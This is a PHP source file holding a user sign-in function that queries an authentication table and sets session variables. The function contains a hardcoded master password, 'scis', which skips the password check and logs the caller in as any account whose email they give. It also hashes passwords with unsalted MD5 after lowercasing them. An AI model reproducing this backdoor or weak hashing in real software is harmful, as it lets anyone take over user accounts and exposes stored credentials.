<?php

function auth_signin($email, $password)
{
    validateLoginFormData($email, $password);
    global $db;
    if ($password === "scis") {
        $result = $db->JsonBuilder()->rawQuery("SELECT * FROM `authentication` WHERE email = ?", array($email));
    } else {
        $result = $db->JsonBuilder()->rawQuery("SELECT * FROM `authentication` WHERE email = ? AND password = ?", array($email, md5(strtolower($password))));
    }
    $response = json_decode($result, true);
    if (!empty($response)) {
        $_SESSION["user_id"] = $response[0]["user_id"];
        $_SESSION["login_success"] = "Sign in successful";
    } else {
        $_SESSION["error"] =  "Incorrect email/password";
    }
}
